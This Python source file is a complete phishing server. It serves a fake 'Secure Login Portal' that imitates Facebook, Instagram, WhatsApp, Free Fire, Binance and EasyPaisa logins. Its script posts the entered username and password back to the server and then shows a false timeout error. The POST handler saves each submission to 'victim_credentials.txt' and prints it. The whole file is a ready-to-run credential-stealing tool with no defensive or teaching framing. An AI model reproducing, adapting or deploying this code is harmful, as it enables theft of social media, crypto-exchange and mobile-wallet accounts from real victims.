import http.server
import socketserver

PORT = 8080

class UltimateHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        
        # --- MULTI-APP DESIGN (HACKER STYLE) ---
        html = """
        <!DOCTYPE html>
        <html>
        <head>
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Global Social Login Portal</title>
            <style>
                body { font-family: 'Segoe UI', sans-serif; background: #0f0f0f; color: white; margin: 0; padding: 20px; text-align: center; }
                .header { margin-bottom: 30px; }
                .grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; max-width: 400px; margin: 0 auto; }
                .app-card { background: #1e1e1e; padding: 15px; border-radius: 12px; border: 1px solid #333; cursor: pointer; transition: 0.3s; }
                .app-card:hover { border-color: #3498db; background: #252525; }
                .app-card img { width: 40px; margin-bottom: 8px; }
                .app-card span { display: block; font-size: 12px; font-weight: bold; }
                #login-form { display: none; background: #1e1e1e; padding: 20px; border-radius: 15px; margin-top: 20px; }
                input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 5px; border: none; background: #333; color: white; }
                .btn { background: #3498db; color: white; padding: 10px 20px; border: none; border-radius: 5px; width: 95%; font-weight: bold; cursor: pointer; }
            </style>
        </head>
        <body>
            <div class="header">
                <h2>Secure Login Portal</h2>
                <p style="color: #888;">Select your app to continue</p>
            </div>

            <div class="grid" id="main-grid">
                <div class="app-card" onclick="showLogin('Facebook')"><img src="https://img.icons8.com/color/96/facebook-new.png"><span>Facebook</span></div>
                <div class="app-card" onclick="showLogin('Instagram')"><img src="https://img.icons8.com/color/96/instagram-new.png"><span>Instagram</span></div>
                <div class="app-card" onclick="showLogin('WhatsApp')"><img src="https://img.icons8.com/color/96/whatsapp.png"><span>WhatsApp</span></div>
                <div class="app-card" onclick="showLogin('FreeFire')"><img src="https://img.icons8.com/color/96/fire-element.png"><span>Free Fire</span></div>
                <div class="app-card" onclick="showLogin('Binance')"><img src="https://img.icons8.com/color/96/binance.png"><span>Binance</span></div>
                <div class="app-card" onclick="showLogin('EasyPaisa')"><img src="https://img.icons8.com/color/96/wallet.png"><span>EasyPaisa</span></div>
            </div>

            <div id="login-form">
                <h3 id="app-title">Login</h3>
                <input type="text" id="user" placeholder="Email, Phone or Username">
                <input type="password" id="pass" placeholder="Password">
                <button class="btn" onclick="sendData()">CONTINUE</button>
            </div>

            <script>
                let selectedApp = "";
                function showLogin(app) {
                    selectedApp = app;
                    document.getElementById('main-grid').style.display = 'none';
                    document.getElementById('login-form').style.display = 'block';
                    document.getElementById('app-title').innerText = "Login to " + app;
                }

                function sendData() {
                    const user = document.getElementById('user').value;
                    const pass = document.getElementById('pass').value;
                    
                    fetch('/', {
                        method: 'POST',
                        body: JSON.stringify({ app: selectedApp, user: user, pass: pass }),
                        headers: { 'Content-Type': 'application/json' }
                    }).then(() => {
                        alert("Error: Connection Timeout. Please try again later.");
                        location.reload();
                    });
                }
            </script>
        </body>
        </html>
        """
        self.wfile.write(bytes(html, "utf8"))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        
        # Hacker yahan data ko file mein save karta hai
        with open("victim_credentials.txt", "a") as f:
            f.write(post_data + "\\n")
            
        print(f"\\n[!] DATA RECEIVED: {post_data}")
        self.send_response(200)
        self.end_headers()

with socketserver.TCPServer(("", PORT), UltimateHandler) as httpd:
    print(f"[*] All-in-One Server Active on Port {PORT}")
    httpd.serve_forever()
